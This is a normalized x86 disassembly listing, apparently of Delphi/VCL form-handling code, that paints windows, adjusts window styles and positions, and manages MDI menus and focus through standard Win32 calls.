mov eax [ eax + 0x18 ]
push eax
call SaveDC
mov [ ebp - 0x8 ] eax
xor eax eax
push ebp
push sub_43e9a4
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x14 ]
mov edx [ eax + 0x18 ]
mov eax [ ebp - 0xc ]
call sub_42579c
mov eax [ rw-data ]
mov edx [ eax + 0x88 ]
mov eax [ ebp - 0xc ]
call sub_425630
mov eax [ ebp - 0x14 ]
movzx eax [ eax + 0x10 ]
push eax
mov eax [ ebp - 0x14 ]
lea ecx [ eax + 0x1c ]
mov edx [ ebp - 0xc ]
mov eax edi
call sub_4391ac
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_43e9ab
xor edx edx
mov eax [ ebp - 0xc ]
call sub_42579c
mov eax [ ebp - 0x8 ]
push eax
mov eax [ ebp - 0x14 ]
mov eax [ eax + 0x18 ]
push eax
call RestoreDC
retn
mov edx [ esi + 0x8 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x290 ]
xor ecx ecx
call sub_437a24
mov edi eax
test edi edi
je r-xdata
mov eax [ ebp - 0x4 ]
movzx eax [ eax + 0x278 ]
dec eax
sub al 0x2
jae r-xdata
mov dl 0x1
mov eax edi
call sub_43bd90
mov esi eax
mov eax [ ebp - 0x4 ]
cmp edi [ eax + 0x268 ]
jne r-xdata
mov eax esi
call sub_44d2f4
mov edi eax
push esi
call GetParent
mov esi eax
test esi esi
je r-xdata
cmp eax [ ebp - 0x4 ]
je r-xdata
mov eax [ ebp - 0x4 ]
call sub_43f4f4
call sub_4585f8
mov esi eax
jmp r-xdata
mov eax [ ebp - 0x4 ]
call sub_4585f8
push eax
call GetWindowDC
mov [ ebp - 0x10 ] eax
xor eax eax
push ebp
push sub_43eaef
push [ fs : eax ]
mov [ fs : eax ] esp
mov dl 0x1
mov eax [ r-xdata ]
call sub_425108
mov [ ebp - 0xc ] eax
xor eax eax
push ebp
push sub_43eac8
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x10 ]
push eax
call SaveDC
mov [ ebp - 0x8 ] eax
xor eax eax
push ebp
push sub_43eaab
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx [ ebp - 0x10 ]
mov eax [ ebp - 0xc ]
call sub_42579c
mov eax [ rw-data ]
mov edx [ eax + 0x88 ]
mov eax [ ebp - 0xc ]
call sub_425630
lea eax [ esi + 0x10 ]
push eax
lea ecx [ esi + 0xc ]
mov edx [ ebp - 0xc ]
mov eax edi
mov ebx [ eax ]
call [ ebx + 0x38 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_43eab2
xor edx edx
mov eax [ ebp - 0xc ]
call sub_42579c
mov eax [ ebp - 0x8 ]
push eax
mov eax [ ebp - 0x10 ]
push eax
call RestoreDC
retn
mov eax [ ebp - 0x4 ]
movzx eax [ eax + 0x278 ]
sub al 0x1
je r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x273 ] 0x2
je r-xdata
test esi esi
je r-xdata
mov eax [ rw-data ]
cmp edi [ eax + 0x64 ]
je r-xdata
push esi
call SetFocus
jmp r-xdata
call sub_4585f8
mov esi eax
mov eax [ ebp - 0x4 ]
movzx eax [ eax + 0x271 ]
sub al 0x2
je r-xdata
sub al 0x2
jne r-xdata
mov eax [ ebx + 0x8 ]
or [ eax + 0x18 ] 0x2
cmp esi [ ebp - 0x4 ]
je r-xdata
mov eax [ ebx + 0x8 ]
or [ eax + 0x18 ] 0x1
jmp r-xdata
sub al 0x3
jne r-xdata
mov eax [ esi + 0x268 ]
test eax eax
je r-xdata
mov eax [ rw-data ]
cmp esi [ eax + 0x68 ]
je r-xdata
mov edx edi
mov eax esi
mov ecx [ eax ]
call [ ecx + 0xf8 ]
jmp r-xdata
cmp edi eax
je r-xdata
push 0x0
xor ecx ecx
mov edx 0x8
call sub_451b4c
sub_43eacf
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x10 ]
push eax
mov eax [ ebp - 0x4 ]
call sub_4585f8
push eax
call ReleaseDC
retn
sub_43eb8c
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov eax [ eax + 0x8 ]
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov eax [ eax + 0x4 ]
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov eax [ eax ]
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x29c ]
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x2bc ]
push eax
call CallWindowProcA
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x8 ]
mov [ edx + 0xc ] eax
pop ebp
retn
sub_43ebd8
push ebp
mov ebp esp
push ebx
push esi
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
call sub_43f528
mov ebx eax
dec ebx
test ebx ebx
jl r-xdata
xor eax eax
inc ebx
xor esi esi
inc esi
dec ebx
jne r-xdata
mov al 0x1
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov edx esi
call sub_43f574
cmp [ eax + 0x273 ] 0x2
jne r-xdata
pop esi
pop ebx
pop ebp
retn
sub_43ec18
push ebp
mov ebp esp
add esp 0xffffff8c
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x8 ]
mov eax [ eax ]
sub eax 0xf
je r-xdata
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x4 ]
mov [ ebp - 0xc ] eax
cmp [ ebp - 0xc ] 0x0
jne r-xdata
sub eax 0x5
je r-xdata
xor eax eax
push ebp
push sub_43ede6
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ ebp - 0xc ] 0x0
jne r-xdata
lea eax [ ebp - 0x4c ]
push eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x29c ]
push eax
call BeginPaint
mov edx [ ebp - 0x8 ]
mov [ edx + 0x4 ] eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x1a4 ]
call sub_424fec
push eax
lea edx [ ebp - 0x6c ]
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x44 ]
lea eax [ ebp - 0x6c ]
push eax
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x4 ]
push eax
call FillRect
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x277 ] 0x2
jne r-xdata
sub eax 0x2b
je r-xdata
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
call sub_455d50
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
cmp [ ebp - 0xc ] 0x0
jne r-xdata
lea eax [ ebp - 0x5c ]
push eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x29c ]
push eax
call GetWindowRect
lea ecx [ ebp - 0x74 ]
lea edx [ ebp - 0x5c ]
mov eax [ ebp - 0x4 ]
call sub_4503d4
mov eax [ ebp - 0x74 ]
mov [ ebp - 0x5c ] eax
mov eax [ ebp - 0x70 ]
mov [ ebp - 0x58 ] eax
mov ecx [ ebp - 0x58 ]
neg ecx
mov edx [ ebp - 0x5c ]
neg edx
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x4 ]
call sub_44eea0
mov eax [ ebp - 0x8 ]
mov [ eax + 0xc ] 0x1
jmp r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x29c ] 0x0
je r-xdata
push ebp
call sub_43eb8c
pop ecx
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x277 ] 0x2
jne r-xdata
sub eax 0x45
jne r-xdata
retn
lea eax [ ebp - 0x4c ]
push eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x29c ]
push eax
call EndPaint
mov esp ebp
pop ebp
retn
lea eax [ ebp - 0x5c ]
push eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x29c ]
push eax
call GetClientRect
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x1a4 ]
call sub_424fec
push eax
lea eax [ ebp - 0x5c ]
push eax
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x4 ]
push eax
call FillRect
mov eax [ ebp - 0x4 ]
call sub_43f528
test eax eax
je r-xdata
push ebp
call sub_43eb8c
pop ecx
push ebp
call sub_43eb8c
pop ecx
mov eax [ ebp - 0x8 ]
cmp [ eax + 0xc ] 0x1
jne r-xdata
mov dl 0x1
push ebp
call sub_43ebd8
pop ecx
test al al
je r-xdata
mov eax [ ebp - 0x8 ]
mov [ eax + 0xc ] 0xffffffff
jmp r-xdata
xor edx edx
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x29c ]
call sub_43b78c
jmp r-xdata
sub_43edf8
push ebx
push esi
push edi
add esp 0xfffffff0
mov esi ecx
mov ebx eax
mov ecx esi
mov eax ebx
call sub_43cac4
mov eax [ ebx + 0x29c ]
test eax eax
je r-xdata
add esp 0x10
pop edi
pop esi
pop ebx
retn
push 0x14
mov ecx [ esi + 0xc ]
mov edi [ esi + 0x4 ]
sub ecx edi
push ecx
mov ecx [ esi + 0x8 ]
mov edx [ esi ]
sub ecx edx
push ecx
push edi
push edx
push 0x1
push eax
call SetWindowPos
cmp [ ebx + 0x277 ] 0x2
jne r-xdata
push esp
mov eax [ ebx + 0x29c ]
push eax
call GetClientRect
test eax eax
je r-xdata
push 0xffffffff
push 0x0
mov eax [ ebx + 0x29c ]
push eax
call InvalidateRect
sub_43ee64
push ebx
push esi
push edi
push ecx
mov ebx eax
mov eax ebx
call sub_43d184
mov eax ebx
call sub_458904
test al al
je r-xdata
mov eax ebx
call sub_420604
mov edi eax
dec edi
test edi edi
jl r-xdata
push 0xffffffec
mov eax ebx
call sub_4585f8
push eax
call GetWindowLongA
and eax 0xffffefff
and eax 0xffffdfff
and eax 0xffffbfff
mov [ esp ] eax
mov edx esp
mov eax ebx
call sub_4547a0
mov eax [ esp ]
push eax
push 0xffffffec
mov eax ebx
call sub_4585f8
push eax
call SetWindowLongA
pop edx
pop edi
pop esi
pop ebx
retn
inc edi
xor esi esi
inc esi
dec edi
jne r-xdata
mov edx esi
mov eax ebx
call sub_4205d8
call sub_4387dc
mov edx esi
mov eax ebx
call sub_4205d8
mov edx [ r-xdata ]
call sub_4047dc
test al al
je r-xdata
sub_43eefc
push ebp
mov ebp esp
push ecx
push esi
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x28c ] 0x0
jne r-xdata
pop esi
pop ecx
pop ebp
retn
mov eax [ ebp - 0x4 ]
mov [ eax + 0x28c ] 0x1
xor eax eax
push ebp
push sub_43ef7c
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x60 ] 0x0
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
mov [ eax + 0x28c ] 0x0
retn
mov eax [ ebp - 0x4 ]
mov esi [ eax + 0x30 ]
test esi esi
jne r-xdata
movzx edx [ esi + 0x5f ]
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x74 ]
mov eax [ rw-data ]
movzx edx [ eax + 0x34 ]
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x74 ]
jmp r-xdata
mov dl 0x1
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x70 ]
sub_43ef88
push ebx
push esi
push edi
mov esi edx
mov ebx eax
mov eax [ esi + 0x4 ]
mov eax [ eax + 0x4 ]
call sub_44d2f4
test eax eax
je r-xdata
mov eax [ ebx + 0x33c ]
call sub_40676c
mov edi eax
lea eax [ edi + 0x1 ]
push eax
lea eax [ ebx + 0x33c ]
mov ecx 0x1
mov edx [ r-xdata ]
call sub_406928
add esp 0x4
mov eax [ ebx + 0x33c ]
mov edx [ esi + 0x4 ]
mov edx [ edx ]
mov [ eax + edi * 8 ] edx
mov eax [ ebx + 0x33c ]
mov edx [ esi + 0x8 ]
mov [ eax + edi * 8 + 0x4 ] edx
mov eax [ esi + 0x4 ]
cmp [ eax + 0x8 ] 0x0
jne r-xdata
pop edi
pop esi
pop ebx
retn
sub_43eff0
push ebx
push esi
push edi
push ebp
push ecx
mov ebp ecx
mov edi edx
mov esi eax
and [ edi ] 0xfff4ffff
and [ ebp ] 0xfffffbff
movzx eax [ esi + 0x271 ]
mov [ esp ] al
cmp [ esi + 0x277 ] 0x1
jne r-xdata
movzx ebx [ esi + 0x270 ]
movzx eax [ esp ]
sub al 0x1
jb r-xdata
movzx eax [ esp ]
test al al
je r-xdata
movzx ebx [ r-xdata ]
jmp r-xdata
sub al 0x2
je r-xdata
mov [ esp ] 0x2
sub al 0x3
jne r-xdata
movzx eax [ esp ]
sub al 0x3
jae r-xdata
movzx eax [ r-xdata ]
and al bl
mov ebx eax
jmp r-xdata
dec eax
sub al 0x2
jb r-xdata
test bl 0x1
je r-xdata
cmp [ esi + 0x277 ] 0x1
jne r-xdata
movzx eax [ r-xdata ]
and al bl
mov ebx eax
jmp r-xdata
test bl 0x8
je r-xdata
or [ edi ] 0x80000
test bl 0x2
je r-xdata
test bl 0x1
je r-xdata
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
or [ ebp ] 0x400
test bl 0x4
je r-xdata
or [ edi ] 0x20000
or [ edi ] 0x10000
sub_43f0b9
add [ eax ] al
add [ ebx + 0x56 ] dl
add esp 0xfffffff4
mov [ esp ] dl
mov ebx eax
movzx eax [ esp ]
cmp al [ ebx + 0x270 ]
je r-xdata
add esp 0xc
pop esi
pop ebx
retn
movzx eax [ esp ]
mov [ ebx + 0x270 ] al
mov eax ebx
call sub_458904
test al al
je r-xdata
test [ ebx + 0x1c ] 0x10
je r-xdata
cmp [ ebx + 0x277 ] 0x1
jne r-xdata
test [ ebx + 0x1c ] 0x10
je r-xdata
push 0xfffffff0
mov eax ebx
call sub_4585f8
push eax
call GetWindowLongA
mov [ esp + 0x4 ] eax
push 0xffffffec
mov eax ebx
call sub_4585f8
push eax
call GetWindowLongA
mov [ esp + 0x8 ] eax
lea ecx [ esp + 0x8 ]
lea edx [ esp + 0x4 ]
mov eax ebx
mov si 0xffaa
call sub_40484c
mov eax [ esp + 0x4 ]
push eax
push 0xfffffff0
mov eax ebx
call sub_4585f8
push eax
call SetWindowLongA
mov eax [ esp + 0x8 ]
push eax
push 0xffffffec
mov eax ebx
call sub_4585f8
push eax
call SetWindowLongA
push 0x37
push 0x0
push 0x0
push 0x0
push 0x0
push 0x0
mov eax ebx
call sub_4585f8
push eax
call SetWindowPos
jmp r-xdata
cmp [ ebx + 0x273 ] 0x2
je r-xdata
cmp [ ebx + 0x30 ] 0x0
je r-xdata
mov eax ebx
call sub_454ff0
sub_43f1a4
push ebp
mov ebp esp
push esi
push edi
mov edi ecx
mov esi eax
and [ edx ] 0x7f3bff7f
and [ edi ] 0xfffffe7e
mov eax [ ebp + 0x8 ]
and [ eax ] 0xffffd7ff
movzx eax [ esi + 0x271 ]
cmp [ esi + 0x277 ] 0x1
jne r-xdata
movzx ecx al
cmp ecx 0x5
ja r-xdata
mov ecx eax
test cl cl
je r-xdata
add al 0xfc
sub al 0x2
jae r-xdata
jmp [ ecx * 4 + jump_table_43f1f2 ]
mov al 0x2
sub cl 0x3
jne r-xdata
pop edi
pop esi
pop ebp
retn 0x4
cmp [ esi + 0x277 ] 0x1
je r-xdata
cmp [ esi + 0x30 ] 0x0
jne r-xdata
or [ edx ] 0xc00000
jmp r-xdata
or [ edx ] 0xc40000
jmp r-xdata
test [ esi + 0x1c ] 0x10
je r-xdata
or [ edi ] 0x80
cmp [ esi + 0x1c4 ] 0x0
jne r-xdata
mov ecx [ edx ]
or ecx 0x80000000
or ecx 0xc00000
mov [ edx ] ecx
cmp [ esi + 0x30 ] 0x0
je r-xdata
or [ edx ] 0x80000000
jmp r-xdata
mov edx [ ebp + 0x8 ]
mov edx [ edx ]
or edx 0x8
or edx 0x800
or edx 0x2000
mov ecx [ ebp + 0x8 ]
mov [ ecx ] edx
mov ecx [ edx ]
or ecx __dos_header
or ecx 0x80
mov [ edx ] ecx
or [ edx ] 0xc00000
jmp r-xdata
mov ecx [ edi ]
or ecx 0x1
or ecx 0x100
mov [ edi ] ecx
mov ecx [ rw-data ]
cmp [ ecx ] 0x0
jne r-xdata
sub_43f2b8
push esi
push edi
add esp 0xfffffff4
mov edi eax
cmp dl [ edi + 0x271 ]
je r-xdata
add esp 0xc
pop edi
pop esi
retn
mov [ edi + 0x271 ] dl
cmp [ edi + 0x258 ] 0x0
je r-xdata
xor edx edx
jmp r-xdata
movzx eax [ edi + 0x271 ]
sub al 0x2
je r-xdata
mov eax edi
call sub_43cc40
mov eax edi
call sub_458904
test al al
je r-xdata
mov dl 0x1
sub al 0x3
je r-xdata
test [ edi + 0x1c ] 0x10
je r-xdata
push 0xfffffff0
mov eax edi
call sub_4585f8
push eax
call GetWindowLongA
mov [ esp ] eax
push 0xffffffec
mov eax edi
call sub_4585f8
push eax
call GetWindowLongA
mov [ esp + 0x4 ] eax
push 0xffffffe6
mov eax edi
call sub_4585f8
push eax
call GetClassLongA
mov [ esp + 0x8 ] eax
lea eax [ esp + 0x8 ]
push eax
lea ecx [ esp + 0x8 ]
lea edx [ esp + 0x4 ]
mov eax edi
mov si 0xffa9
call sub_40484c
lea ecx [ esp + 0x4 ]
mov edx esp
mov eax edi
mov si 0xffaa
call sub_40484c
mov eax [ esp ]
push eax
push 0xfffffff0
mov eax edi
call sub_4585f8
push eax
call SetWindowLongA
mov eax [ esp + 0x4 ]
push eax
push 0xffffffec
mov eax edi
call sub_4585f8
push eax
call SetWindowLongA
mov eax [ esp + 0x8 ]
push eax
push 0xffffffe6
mov eax edi
call sub_4585f8
push eax
call SetClassLongA
mov eax edi
call sub_458904
test al al
je r-xdata
test [ edi + 0x1c ] 0x10
je r-xdata
push 0x37
push 0x0
push 0x0
push 0x0
push 0x0
push 0x0
mov eax edi
call sub_4585f8
push eax
call SetWindowPos
mov eax edi
mov edx [ eax ]
call [ edx + 0x80 ]
mov eax [ rw-data ]
cmp [ eax ] 0x0
je r-xdata
cmp [ edi + 0x30 ] 0x0
je r-xdata
push 0xffffffff
mov eax edi
call sub_4585f8
push eax
call GetSystemMenu
push 0x0
xor ecx ecx
mov edx 0x81
mov eax edi
call sub_451b4c
cmp [ edi + 0x271 ] 0x3
je r-xdata
push 0x0
push 0x1
push 0x80
mov eax edi
call sub_4585f8
push eax
call SendMessageA
mov eax edi
call sub_441144
push eax
push 0x1
push 0x80
mov eax edi
call sub_4585f8
push eax
call SendMessageA
jmp r-xdata
sub_43f458
push ebx
push esi
push edi
add esp 0xfffffff0
mov esi ecx
lea edi [ esp ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov ebx eax
mov edi [ ebx + 0x30 ]
mov esi [ ebx + 0x94 ]
mov ecx esp
mov eax ebx
call sub_44fff4
mov eax [ ebx + 0x30 ]
test eax eax
je r-xdata
add esp 0x10
pop edi
pop esi
pop ebx
retn
cmp edi eax
jne r-xdata
cmp esi [ ebx + 0x94 ]
je r-xdata
mov eax ebx
call sub_454ff0
sub_43f49c
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
cmp esi [ ebx + 0x94 ]
je r-xdata
mov ecx edi
mov edx esi
mov eax ebx
call sub_450124
pop edi
pop esi
pop ebx
retn
test esi esi
je r-xdata
test esi esi
jne r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx + 0x54 ]
test al al
je r-xdata
movzx eax [ ebx + 0x271 ]
mov [ ebx + 0x2c8 ] al
mov [ ebx + 0x271 ] 0x0
movzx eax [ ebx + 0x2c8 ]
mov [ ebx + 0x271 ] al
jmp r-xdata
sub_43f4f4
push ebx
mov ebx eax
xor eax eax
cmp [ ebx + 0x277 ] 0x2
jne r-xdata
pop ebx
retn
cmp [ ebx + 0x29c ] 0x0
je r-xdata
push 0x0
push 0x0
push 0x229
mov eax [ ebx + 0x29c ]
push eax
call SendMessageA
call sub_44d2f4
sub_43f528
push ebx
push esi
push edi
xor edi edi
cmp [ eax + 0x277 ] 0x2
jne r-xdata
mov eax edi
pop edi
pop esi
pop ebx
retn
cmp [ eax + 0x29c ] 0x0
je r-xdata
mov eax [ rw-data ]
call sub_443e04
mov ebx eax
dec ebx
test ebx ebx
jl r-xdata
inc ebx
xor esi esi
inc esi
dec ebx
jne r-xdata
inc edi
mov edx esi
mov eax [ rw-data ]
call sub_443df0
cmp [ eax + 0x277 ] 0x1
jne r-xdata
sub_43f574
push ebx
push esi
push edi
mov edi edx
cmp [ eax + 0x277 ] 0x2
jne r-xdata
xor eax eax
cmp [ eax + 0x29c ] 0x0
je r-xdata
mov eax [ rw-data ]
call sub_443e04
mov ebx eax
dec ebx
test ebx ebx
jl r-xdata
inc ebx
xor esi esi
inc esi
dec ebx
jne r-xdata
dec edi
test edi edi
jl r-xdata
mov edx esi
mov eax [ rw-data ]
call sub_443df0
cmp [ eax + 0x277 ] 0x1
jne r-xdata
pop edi
pop esi
pop ebx
retn
sub_43f5c4
push ebp
mov ebp esp
push ebx
mov ebx [ ebp + 0x14 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_404620
mov edx [ ebp + 0x8 ]
mov [ eax + 0x4 ] edx
mov edx [ ebx + 0x8 ]
mov [ eax + 0x8 ] edx
mov edx eax
mov eax ebx
call sub_419740
mov al 0x1
pop ebx
pop ebp
retn 0x10
sub_43f5f4
push ebx
push esi
push edi
push ebp
mov ebx eax
xor ebp ebp
push 0x2
mov eax ebx
call sub_4585f8
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
mov edi eax
mov eax [ rw-data ]
call sub_443dd4
mov esi eax
dec esi
test esi esi
jl r-xdata
mov eax [ rw-data ]
call sub_444cac
mov eax [ rw-data ]
call sub_443dd4
mov esi eax
dec esi
test esi esi
jl r-xdata
inc esi
xor ebx ebx
mov eax ebp
pop ebp
pop edi
pop esi
pop ebx
retn
inc esi
xor ebx ebx
inc ebx
dec esi
jne r-xdata
mov edx ebx
mov eax [ rw-data ]
call sub_443dc0
mov ebp eax
jmp r-xdata
inc ebx
dec esi
jne r-xdata
mov edx ebx
mov eax [ rw-data ]
call sub_443dc0
mov ebp eax
jmp r-xdata
mov edx ebx
mov eax [ rw-data ]
call sub_443dc0
cmp edi [ eax + 0x4 ]
jne r-xdata
mov edx ebx
mov eax [ rw-data ]
call sub_443dc0
cmp edi [ eax + 0x4 ]
jne r-xdata
sub_43f6b0
push ebx
mov ebx eax
mov eax ebx
call sub_43f6a8
test al al
je r-xdata
xor eax eax
pop ebx
retn
mov eax [ ebx + 0x288 ]
call sub_42b008
test eax eax
jne r-xdata
mov al 0x1
pop ebx
retn
sub_43f6d8
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
mov ebx edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
cmp bl [ eax + 0x277 ]
je r-xdata
pop ebx
pop ecx
pop ecx
pop ebp
retn
test bl bl
jne r-xdata
cmp bl 0x3
jne r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x277 ] 0x3
je r-xdata
cmp bl 0x1
jne r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x277 ] 0x0
jne r-xdata
mov eax [ ebp - 0x4 ]
mov [ eax + 0x277 ] bl
mov eax [ ebp - 0x4 ]
test [ eax + 0x1c ] 0x10
jne r-xdata
mov eax [ ebp - 0x4 ]
test [ eax + 0x1c ] 0x10
setne al
xor al 0x1
mov [ ebp - 0x5 ] al
cmp [ ebp - 0x5 ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x278 ] 0x0
jne r-xdata
mov eax [ ebp - 0x4 ]
call sub_458904
test al al
je r-xdata
xor edx edx
push ebp
push sub_43f840
push [ fs : edx ]
mov [ fs : edx ] esp
cmp [ ebp - 0x5 ] 0x0
je r-xdata
mov dl 0x1
mov eax [ ebp - 0x4 ]
call sub_459998
mov dl 0x1
mov eax [ ebp - 0x4 ]
call sub_43fbe0
push 0x213
push 0x0
push 0x0
push 0x0
push 0x0
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x277 ] 0x3
sete al
and eax 0x7f
mov eax [ eax * 4 + rw-data ]
push eax
mov eax [ ebp - 0x4 ]
call sub_4585f8
push eax
call SetWindowPos
jmp r-xdata
mov eax [ ebp - 0x4 ]
movzx eax [ eax + 0x277 ]
mov edx [ ebp - 0x4 ]
mov [ edx + 0x277 ] bl
cmp bl 0x2
je r-xdata
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0xb0 ]
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x1d9 ] 0x0
jne r-xdata
cmp al 0x2
jne r-xdata
cmp [ ebp - 0x5 ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
call sub_43fd18
mov edx eax
mov eax [ ebp - 0x4 ]
call sub_450a08
cmp bl 0x1
jne r-xdata
mov eax [ ebp - 0x4 ]
call sub_4551b8
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
cmp [ ebp - 0x5 ] 0x0
je r-xdata
mov dl 0x1
mov eax [ ebp - 0x4 ]
call sub_43e40c
retn
xor edx edx
mov eax [ ebp - 0x4 ]
call sub_459998
sub_43f84c
push ebx
push esi
push edi
push ebp
mov ebp eax
cmp [ ebp + 0x277 ] 0x2
jne r-xdata
pop ebp
pop edi
pop esi
pop ebx
retn
cmp [ ebp + 0x29c ] 0x0
je r-xdata
xor esi esi
mov eax [ ebp + 0x290 ]
test eax eax
je r-xdata
xor edi edi
mov eax [ ebp + 0x2a0 ]
test eax eax
je r-xdata
mov edx [ eax ]
call [ edx + 0x34 ]
mov esi eax
mov eax ebp
call sub_4585f8
push eax
call GetMenu
cmp esi eax
setne bl
push edi
push esi
push 0x230
mov eax [ ebp + 0x29c ]
push eax
call SendMessageA
test bl bl
je r-xdata
call sub_434a54
mov edi eax
mov eax ebp
call sub_4585f8
push eax
call DrawMenuBar
sub_43f8c8
push ebx
mov ebx edx
mov [ eax + 0x2a8 ] ebx
test ebx ebx
je r-xdata
pop ebx
retn
mov edx eax
mov eax ebx
call sub_420098
xor edx edx
mov eax ebx
call sub_4364cc
sub_43f8ec
push ebx
mov ebx eax
cmp edx [ ebx + 0x2a0 ]
je r-xdata
pop ebx
retn
mov [ ebx + 0x2a0 ] edx
test edx edx
je r-xdata
mov eax ebx
call sub_43f84c
mov eax edx
mov edx ebx
call sub_420098
sub_43f914
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
push esi
push edi
xor ecx ecx
mov [ ebp - 0x10 ] ecx
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_43fb28
push [ fs : eax ]
mov [ fs : eax ] esp
test esi esi
je r-xdata
mov eax [ ebx + 0x290 ]
test eax eax
je r-xdata
mov eax [ rw-data ]
call sub_443e04
dec eax
test eax eax
jl r-xdata
test [ ebx + 0x1c ] 0x8
jne r-xdata
xor edx edx
call sub_4382c8
inc eax
mov [ ebp - 0x4 ] eax
xor edi edi
xor esi esi
test esi esi
je r-xdata
inc edi
dec [ ebp - 0x4 ]
jne r-xdata
mov edx edi
mov eax [ rw-data ]
call sub_443df0
cmp ebx eax
je r-xdata
test esi esi
je r-xdata
mov edx ebx
mov eax esi
call sub_420098
mov [ ebx + 0x290 ] esi
test esi esi
je r-xdata
test [ esi + 0x1c ] 0x8
je r-xdata
mov edx edi
mov eax [ rw-data ]
call sub_443df0
cmp esi [ eax + 0x290 ]
jne r-xdata
mov eax [ esi + 0x8 ]
mov [ ebp - 0xc ] eax
mov [ ebp - 0x8 ] 0xb
lea eax [ ebp - 0xc ]
push eax
push 0x0
lea edx [ ebp - 0x10 ]
mov eax [ rw-data ]
call sub_407550
mov ecx [ ebp - 0x10 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40db38
call sub_404ec4
mov eax ebx
call sub_458904
test al al
je r-xdata
test [ ebx + 0x1c ] 0x10
jne r-xdata
cmp [ ebx + 0x276 ] 0x0
je r-xdata
push 0x0
mov eax ebx
call sub_4585f8
push eax
call SetMenu
mov eax [ ebx + 0x290 ]
cmp [ eax + 0x5c ] 0x0
jne r-xdata
cmp [ ebx + 0x271 ] 0x3
je r-xdata
mov eax ebx
call sub_43f84c
cmp [ ebx + 0x298 ] 0x0
je r-xdata
mov dl 0x1
mov eax ebx
call sub_440fd0
test [ ebx + 0x1c ] 0x10
je r-xdata
cmp [ ebx + 0x277 ] 0x1
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_43fb2f
lea eax [ ebp - 0x10 ]
call sub_405530
retn
test [ ebx + 0x1c ] 0x10
je r-xdata
cmp [ ebx + 0x277 ] 0x1
je r-xdata
mov eax ebx
call sub_458904
test al al
je r-xdata
cmp [ ebx + 0x30 ] 0x0
je r-xdata
mov eax ebx
call sub_458904
test al al
je r-xdata
mov eax [ ebx + 0x290 ]
mov edx [ eax ]
call [ edx + 0x34 ]
mov edi eax
mov eax ebx
call sub_4585f8
push eax
call GetMenu
cmp edi eax
je r-xdata
push 0x37
push 0x0
push 0x0
push 0x0
push 0x0
push 0x0
mov eax ebx
call sub_4585f8
push eax
call SetWindowPos
push 0x0
xor ecx ecx
mov edx 0x85
mov eax ebx
call sub_451b4c
push 0x0
